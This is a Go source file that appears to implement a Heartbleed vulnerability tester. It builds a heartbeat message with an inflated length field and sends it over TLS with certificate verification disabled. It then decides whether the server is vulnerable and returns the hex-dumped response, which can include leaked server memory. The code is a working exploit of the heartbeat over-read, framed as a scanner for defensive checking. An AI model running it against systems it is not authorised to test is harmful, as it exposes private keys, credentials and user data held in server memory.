package heartbleed

import (
	"bytes"
	"encoding/binary"
	"errors"
	"github.com/FiloSottile/Heartbleed/tls"
	"github.com/davecgh/go-spew/spew"
	"time"
)

var Safe = errors.New("heartbleed: no response or payload not found")
var Timeout = errors.New("heartbleed: timeout")

var padding = []byte("YELLOW SUBMARINE")

// struct {
//    uint8  type;
//    uint16 payload_length;
//    opaque payload[HeartbeatMessage.payload_length];
//    opaque padding[padding_length];
// } HeartbeatMessage;
func buildEvilMessage(payload []byte) []byte {
	buf := bytes.Buffer{}
	err := binary.Write(&buf, binary.BigEndian, uint8(1))
	if err != nil {
		panic(err)
	}
	err = binary.Write(&buf, binary.BigEndian, uint16(len(payload)+100))
	if err != nil {
		panic(err)
	}
	_, err = buf.Write(payload)
	if err != nil {
		panic(err)
	}
	_, err = buf.Write(padding)
	if err != nil {
		panic(err)
	}
	return buf.Bytes()
}

func heartbleedCheck(conn *tls.Conn, buf *bytes.Buffer, vuln chan bool) func([]byte) {
	return func(data []byte) {
		spew.Fdump(buf, data)
		if bytes.Index(data, padding) == -1 {
			vuln <- false
		} else {
			vuln <- true
		}
	}
}

func Heartbleed(host string, payload []byte) (out []byte, err error) {
	conn, err := tls.Dial("tcp", host, &tls.Config{InsecureSkipVerify: true})
	if err != nil {
		return
	}

	var vuln = make(chan bool, 1)
	buf := new(bytes.Buffer)
	conn.SendHeartbeat([]byte(buildEvilMessage(payload)), heartbleedCheck(conn, buf, vuln))

	go func() {
		conn.Read(nil)
	}()

	go func() {
		time.Sleep(3 * time.Second)
		_, err = conn.Write([]byte("quit\n"))
		conn.Read(nil)
		vuln <- false
	}()

	select {
	case status := <-vuln:
		conn.Close()
		if status {
			out = buf.Bytes()
			return out, nil // VULNERABLE
		} else if err != nil {
			return
		} else {
			err = Safe
			return
		}
	case <-time.After(10 * time.Second):
		err = Timeout
		conn.Close()
		return
	}

}
